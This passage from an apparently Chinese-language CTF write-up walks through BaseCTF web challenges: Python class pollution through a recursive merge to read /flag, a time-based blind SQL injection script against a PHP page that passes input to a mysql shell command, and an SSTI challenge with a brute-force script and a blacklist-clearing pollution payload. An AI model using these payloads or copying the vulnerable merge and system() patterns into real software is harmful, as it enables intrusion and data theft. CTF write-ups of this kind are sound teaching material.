</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=sa>f</span><span class=s2>&#34;J1ngHong说：你想read flag吗？</span>
</span></span><span class=line><span class=cl><span class=n>那么圣钥之光必将阻止你</span><span class=err>！</span>
</span></span><span class=line><span class=cl><span class=n>但是小小的源码没事</span><span class=err>，</span><span class=n>因为你也读不到flag</span><span class=p>(</span><span class=n>乐</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span><span class=n>file</span><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=s2>&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nd>@app.route</span><span class=p>(</span><span class=s1>&#39;/pollute&#39;</span><span class=p>,</span> <span class=n>methods</span><span class=o>=</span><span class=p>[</span><span class=s1>&#39;GET&#39;</span><span class=p>,</span> <span class=s1>&#39;POST&#39;</span><span class=p>])</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>Pollution</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>request</span><span class=o>.</span><span class=n>is_json</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>merge</span><span class=p>(</span><span class=n>json</span><span class=o>.</span><span class=n>loads</span><span class=p>(</span><span class=n>request</span><span class=o>.</span><span class=n>data</span><span class=p>),</span><span class=n>instance</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=s2>&#34;J1ngHong说：钥匙圣洁无暇，无人可以污染！&#34;</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=s2>&#34;J1ngHong说：圣钥暗淡了一点，你居然污染成功了？&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s1>&#39;__main__&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>app</span><span class=o>.</span><span class=n>run</span><span class=p>(</span><span class=n>host</span><span class=o>=</span><span class=s1>&#39;0.0.0.0&#39;</span><span class=p>,</span><span class=n>port</span><span class=o>=</span><span class=mi>80</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><p>我不会污染，所以仔细看看这个</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=k>class</span> <span class=nc>cls</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=fm>__init__</span><span class=p>(</span><span class=bp>self</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=k>pass</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>instance</span> <span class=o>=</span> <span class=bp>cls</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=c1># 这里创建了一个空的对象</span>
</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=k>if</span> <span class=n>request</span><span class=o>.</span><span class=n>is_json</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>merge</span><span class=p>(</span><span class=n>json</span><span class=o>.</span><span class=n>loads</span><span class=p>(</span><span class=n>request</span><span class=o>.</span><span class=n>data</span><span class=p>),</span> <span class=n>instance</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c1># 直接动态整合进instance对象</span>
</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=k>def</span> <span class=nf>merge</span><span class=p>(</span><span class=n>src</span><span class=p>,</span> <span class=n>dst</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>k</span><span class=p>,</span> <span class=n>v</span> <span class=ow>in</span> <span class=n>src</span><span class=o>.</span><span class=n>items</span><span class=p>():</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=nb>hasattr</span><span class=p>(</span><span class=n>dst</span><span class=p>,</span> <span class=s1>&#39;__getitem__&#39;</span><span class=p>):</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>dst</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=n>k</span><span class=p>)</span> <span class=ow>and</span> <span class=nb>type</span><span class=p>(</span><span class=n>v</span><span class=p>)</span> <span class=o>==</span> <span class=nb>dict</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=n>merge</span><span class=p>(</span><span class=n>v</span><span class=p>,</span> <span class=n>dst</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=n>k</span><span class=p>))</span>
</span></span><span class=line><span class=cl>            <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=n>dst</span><span class=p>[</span><span class=n>k</span><span class=p>]</span> <span class=o>=</span> <span class=n>v</span>
</span></span><span class=line><span class=cl>        <span class=k>elif</span> <span class=nb>hasattr</span><span class=p>(</span><span class=n>dst</span><span class=p>,</span> <span class=n>k</span><span class=p>)</span> <span class=ow>and</span> <span class=nb>type</span><span class=p>(</span><span class=n>v</span><span class=p>)</span> <span class=o>==</span> <span class=nb>dict</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>merge</span><span class=p>(</span><span class=n>v</span><span class=p>,</span> <span class=nb>getattr</span><span class=p>(</span><span class=n>dst</span><span class=p>,</span> <span class=n>k</span><span class=p>))</span>
</span></span><span class=line><span class=cl>        <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=nb>setattr</span><span class=p>(</span><span class=n>dst</span><span class=p>,</span> <span class=n>k</span><span class=p>,</span> <span class=n>v</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c1># 进行动态设置属性setattr</span>
</span></span></code></pre></td></tr></table></div></div><p>那么打开的是<code>__file__</code>,属性这里我们直接污染即可</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>Request:
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>POST /pollute HTTP/1.1
</span></span><span class=line><span class=cl>Host: challenge.basectf.fun:27578
</span></span><span class=line><span class=cl>Cache-Control: max-age=0
</span></span><span class=line><span class=cl>Upgrade-Insecure-Requests: 1
</span></span><span class=line><span class=cl>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36
</span></span><span class=line><span class=cl>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
</span></span><span class=line><span class=cl>Accept-Encoding: gzip, deflate
</span></span><span class=line><span class=cl>Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
</span></span><span class=line><span class=cl>Cookie: PHPSESSID=9c14647va91fmsku06lsevlmij
</span></span><span class=line><span class=cl>Connection: close
</span></span><span class=line><span class=cl>Content-Type: application/json
</span></span><span class=line><span class=cl>Content-Length: 70
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>{
</span></span><span class=line><span class=cl>	&#34;__init__&#34;:{
</span></span><span class=line><span class=cl>		&#34;__globals__&#34;:{
</span></span><span class=line><span class=cl>			&#34;__file__&#34;:&#34;/flag&#34;
</span></span><span class=line><span class=cl>		}
</span></span><span class=line><span class=cl>	}
</span></span><span class=line><span class=cl>}
</span></span></code></pre></td></tr></table></div></div><p>访问<code>/read</code>即可</p><h2 id=week4-only-one-sql>[Week4] only one sql</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=nx>highlight_file</span><span class=p>(</span><span class=no>__FILE__</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nv>$sql</span> <span class=o>=</span> <span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;sql&#39;</span><span class=p>];</span>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=nx>preg_match</span><span class=p>(</span><span class=s1>&#39;/select|;|@|\n/i&#39;</span><span class=p>,</span> <span class=nv>$sql</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>die</span><span class=p>(</span><span class=s2>&#34;你知道的，不可能有sql注入&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=nx>preg_match</span><span class=p>(</span><span class=s1>&#39;/&#34;|\$|`|\\\\/i&#39;</span><span class=p>,</span> <span class=nv>$sql</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>die</span><span class=p>(</span><span class=s2>&#34;你知道的，不可能有RCE&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=c1>//flag in ctf.flag
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=nv>$query</span> <span class=o>=</span> <span class=s2>&#34;mysql -u root -p123456 -e </span><span class=se>\&#34;</span><span class=s2>use ctf;select &#39;没有select，让你执行一句又如何&#39;;&#34;</span> <span class=o>.</span> <span class=nv>$sql</span> <span class=o>.</span> <span class=s2>&#34;</span><span class=se>\&#34;</span><span class=s2>&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nx>system</span><span class=p>(</span><span class=nv>$query</span><span class=p>);</span> 
</span></span></code></pre></td></tr></table></div></div><p>发现可以插入sql语句，但是禁用了<code>select</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=o>?</span><span class=k>sql</span><span class=o>=</span><span class=k>update</span><span class=w> </span><span class=n>flag</span><span class=w> </span><span class=k>set</span><span class=w> </span><span class=n>id</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=s1>&#39;wi&#39;</span><span class=w> </span><span class=k>where</span><span class=w> </span><span class=k>data</span><span class=w> </span><span class=n>regexp</span><span class=w> </span><span class=s1>&#39;^Basectf&#39;</span><span class=w> </span><span class=k>and</span><span class=w> </span><span class=k>if</span><span class=p>(</span><span class=k>data</span><span class=w> </span><span class=n>REGEXP</span><span class=w> </span><span class=s1>&#39;^Basectf{&#39;</span><span class=p>,</span><span class=n>sleep</span><span class=p>(</span><span class=mi>3</span><span class=p>),</span><span class=w> </span><span class=mi>1</span><span class=p>)</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><p>这是正则的姿势，后面想想好像这个也行</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sql data-lang=sql><span class=line><span class=cl><span class=o>?</span><span class=k>sql</span><span class=o>=</span><span class=k>show</span><span class=w> </span><span class=n>columns</span><span class=w> </span><span class=k>from</span><span class=w> </span><span class=n>flag</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=n>Field</span><span class=w> </span><span class=k>Type</span><span class=w> </span><span class=k>Null</span><span class=w> </span><span class=k>Key</span><span class=w> </span><span class=k>Default</span><span class=w> </span><span class=n>Extra</span><span class=w> </span><span class=n>id</span><span class=w> </span><span class=nb>varchar</span><span class=p>(</span><span class=mi>300</span><span class=p>)</span><span class=w> </span><span class=n>YES</span><span class=w> </span><span class=k>NULL</span><span class=w> </span><span class=k>data</span><span class=w> </span><span class=nb>varchar</span><span class=p>(</span><span class=mi>300</span><span class=p>)</span><span class=w> </span><span class=n>YES</span><span class=w> </span><span class=k>NULL</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><p>字符转16进制</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>0x73656c656374202a2066726f6d2060666c616760
</span></span></code></pre></td></tr></table></div></div><p>emm,发现不行，因为只能用一句话，所以还是盲注吧</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>requests</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>time</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>url</span> <span class=o>=</span> <span class=s2>&#34;http://challenge.basectf.fun:36108/&#34;</span>  <span class=c1># 替换为目标 URL</span>
</span></span><span class=line><span class=cl><span class=n>strings</span> <span class=o>=</span> <span class=s1>&#39;qwertyuiopasdfghjklzxcvbnm-</span><span class=si>{}</span><span class=s1>1234567890&#39;</span>
</span></span><span class=line><span class=cl><span class=n>target</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span>  <span class=c1># 初始的 flag 字符串</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>45</span><span class=p>):</span>  <span class=c1># 猜测 flag 长度</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>j</span> <span class=ow>in</span> <span class=n>strings</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=c1># 构造 payload</span>
</span></span><span class=line><span class=cl>        <span class=n>payload</span> <span class=o>=</span> <span class=s2>&#34;update flag set id = &#39;wi&#39; where data regexp &#39;^BaseCTF&#39; and if(data REGEXP &#39;^</span><span class=si>{}</span><span class=s2>&#39;,sleep(1.5), 1)&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>((</span><span class=n>target</span> <span class=o>+</span> <span class=n>j</span><span class=p>))</span>
</span></span><span class=line><span class=cl>        <span class=n>params</span> <span class=o>=</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=s1>&#39;sql&#39;</span><span class=p>:</span> <span class=n>payload</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1># 记录开始时间</span>
</span></span><span class=line><span class=cl>        <span class=n>start_time</span> <span class=o>=</span> <span class=n>time</span><span class=o>.</span><span class=n>time</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        
</span></span><span class=line><span class=cl>        <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=c1># 发送请求</span>
</span></span><span class=line><span class=cl>            <span class=n>r</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=n>url</span><span class=o>=</span><span class=n>url</span><span class=p>,</span> <span class=n>params</span><span class=o>=</span><span class=n>params</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>end_time</span> <span class=o>=</span> <span class=n>time</span><span class=o>.</span><span class=n>time</span><span class=p>()</span>  <span class=c1># 记录结束时间</span>
</span></span><span class=line><span class=cl>            <span class=n>response_time</span> <span class=o>=</span> <span class=n>end_time</span> <span class=o>-</span> <span class=n>start_time</span>  <span class=c1># 计算响应时间</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=c1># 输出调试信息，记录每次的响应时间</span>
</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;Trying character: </span><span class=si>{</span><span class=n>j</span><span class=si>}</span><span class=s2>, response time: </span><span class=si>{</span><span class=n>response_time</span><span class=si>:</span><span class=s2>.2f</span><span class=si>}</span><span class=s2> seconds&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=c1># 判断是否有延迟（响应时间大于 1 秒更可靠）</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>response_time</span> <span class=o>&gt;</span> <span class=mi>1</span><span class=p>:</span>  <span class=c1># 调整阈值为 1 秒或以上</span>
</span></span><span class=line><span class=cl>                <span class=n>target</span> <span class=o>+=</span> <span class=n>j</span>  <span class=c1># 猜测的字符正确，更新 target</span>
</span></span><span class=line><span class=cl>                <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;Found character: </span><span class=si>{</span><span class=n>j</span><span class=si>}</span><span class=s2>, current target: </span><span class=si>{</span><span class=n>target</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=k>break</span>  <span class=c1># 跳出内层循环，猜测下一个字符</span>
</span></span><span class=line><span class=cl>        <span class=k>except</span> <span class=n>requests</span><span class=o>.</span><span class=n>RequestException</span> <span class=k>as</span> <span class=n>e</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;Request failed: </span><span class=si>{</span><span class=n>e</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=k>continue</span>  <span class=c1># 如果请求失败，跳过继续尝试下一个字符</span>
</span></span></code></pre></td></tr></table></div></div><p>调了半天的脚本发现是靶机过期了，然后调整一下flag就行了</p><h2 id=fin-jinja-mark>[Fin] Jinja Mark</h2><p>一看题目就是个SSTI，有几个路由可以看看</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>/index  注入点
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>/flag	四位数字
</span></span></code></pre></td></tr></table></div></div><p>先写个脚本来爆破数字</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>requests</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>time</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>url</span><span class=o>=</span><span class=s2>&#34;http://challenge.basectf.fun:47522/flag&#34;</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>1000</span><span class=p>,</span><span class=mi>10000</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>data</span><span class=o>=</span><span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=s1>&#39;lucky_number&#39;</span><span class=p>:</span><span class=n>i</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=n>r</span><span class=o>=</span><span class=n>requests</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>url</span><span class=o>=</span><span class=n>url</span><span class=p>,</span><span class=n>data</span><span class=o>=</span><span class=n>data</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=n>i</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>time</span><span class=o>.</span><span class=n>sleep</span><span class=p>(</span><span class=mf>0.3</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=n>r</span><span class=o>.</span><span class=n>text</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=s2>&#34;用POST方式把 lucky_number 告诉我吧，只有四位数哦&#34;</span> <span class=ow>not</span> <span class=ow>in</span> <span class=n>r</span><span class=o>.</span><span class=n>text</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>break</span>
</span></span></code></pre></td></tr></table></div></div><p>emm,但是爆到2000多的时候我觉得太慢了，于是还是换成<code>bp</code>来爆破了</p><p>最后爆破出来是5346得到源码</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>BLACKLIST_IN_index</span> <span class=o>=</span> <span class=p>[</span><span class=s1>&#39;{&#39;</span><span class=p>,</span><span class=s1>&#39;}&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>merge</span><span class=p>(</span><span class=n>src</span><span class=p>,</span> <span class=n>dst</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>k</span><span class=p>,</span> <span class=n>v</span> <span class=ow>in</span> <span class=n>src</span><span class=o>.</span><span class=n>items</span><span class=p>():</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=nb>hasattr</span><span class=p>(</span><span class=n>dst</span><span class=p>,</span> <span class=s1>&#39;__getitem__&#39;</span><span class=p>):</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>dst</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=n>k</span><span class=p>)</span> <span class=ow>and</span> <span class=nb>type</span><span class=p>(</span><span class=n>v</span><span class=p>)</span> <span class=o>==</span> <span class=nb>dict</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=n>merge</span><span class=p>(</span><span class=n>v</span><span class=p>,</span> <span class=n>dst</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=n>k</span><span class=p>))</span>
</span></span><span class=line><span class=cl>            <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=n>dst</span><span class=p>[</span><span class=n>k</span><span class=p>]</span> <span class=o>=</span> <span class=n>v</span>
</span></span><span class=line><span class=cl>        <span class=k>elif</span> <span class=nb>hasattr</span><span class=p>(</span><span class=n>dst</span><span class=p>,</span> <span class=n>k</span><span class=p>)</span> <span class=ow>and</span> <span class=nb>type</span><span class=p>(</span><span class=n>v</span><span class=p>)</span> <span class=o>==</span> <span class=nb>dict</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>merge</span><span class=p>(</span><span class=n>v</span><span class=p>,</span> <span class=nb>getattr</span><span class=p>(</span><span class=n>dst</span><span class=p>,</span> <span class=n>k</span><span class=p>))</span>
</span></span><span class=line><span class=cl>        <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=nb>setattr</span><span class=p>(</span><span class=n>dst</span><span class=p>,</span> <span class=n>k</span><span class=p>,</span> <span class=n>v</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nd>@app.route</span><span class=p>(</span><span class=s1>&#39;/magic&#39;</span><span class=p>,</span><span class=n>methods</span><span class=o>=</span><span class=p>[</span><span class=s1>&#39;POST&#39;</span><span class=p>,</span> <span class=s1>&#39;GET&#39;</span><span class=p>])</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>pollute</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>request</span><span class=o>.</span><span class=n>method</span> <span class=o>==</span> <span class=s1>&#39;POST&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>request</span><span class=o>.</span><span class=n>is_json</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>merge</span><span class=p>(</span><span class=n>json</span><span class=o>.</span><span class=n>loads</span><span class=p>(</span><span class=n>request</span><span class=o>.</span><span class=n>data</span><span class=p>),</span> <span class=n>instance</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=s2>&#34;这个魔术还行吧&#34;</span>
</span></span><span class=line><span class=cl>        <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=s2>&#34;我要json的魔术&#34;</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=s2>&#34;记得用POST方法把魔术交上来&#34;</span>
</span></span></code></pre></td></tr></table></div></div><p>写个脚本来污染</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>requests</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>json</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>url</span> <span class=o>=</span><span class=s2>&#34;http://challenge.basectf.fun:47522/magic&#34;</span>
</span></span><span class=line><span class=cl><span class=n>payload</span><span class=o>=</span><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;__class__&#34;</span><span class=p>:{</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;__init__&#34;</span><span class=p>:{</span>
</span></span><span class=line><span class=cl>            <span class=s2>&#34;__globals__&#34;</span><span class=p>:{</span>
</span></span><span class=line><span class=cl>                <span class=s2>&#34;BLACKLIST_IN_index&#34;</span><span class=p>:()</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=n>headers</span><span class=o>=</span><span class=p>{</span><span class=s1>&#39;Content-Type&#39;</span><span class=p>:</span><span class=s1>&#39;application/json&#39;</span><span class=p>}</span>
